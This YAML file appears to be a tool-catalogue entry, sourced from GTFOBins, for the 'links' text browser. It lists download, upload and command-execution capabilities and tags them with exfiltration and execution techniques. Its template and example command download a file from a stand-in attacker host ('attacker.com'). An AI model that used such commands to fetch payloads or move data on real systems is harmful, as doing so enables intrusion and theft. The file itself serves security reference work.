---
id: network-transfer-links
namespace: network:transfer:links
name: links
description: Text web browser, can download files and execute commands.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - network.transfer.upload
  - security.execution.command
platforms:
  - linux
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - w3m
  - lynx
  - elinks
artifacts: []
workflow_edges:
  produces:
    - file-content
    - command-execution
  consumes:
    - file
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: File or command output
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - links
  - wget
  - curl
  - Bash
  - execFile
parameters: []
features:
  - file-system
  - interactive
  - process-manip
execution:
  template: "links https://attacker.com/file"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Download a file via links
    command: links https://attacker.com/file
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/links/"
techniques:
  - exfiltration
  - collection
  - execution
install:
  - method: apt
    package_name: "links"
    commands:
      - "apt-get install -y links"
---
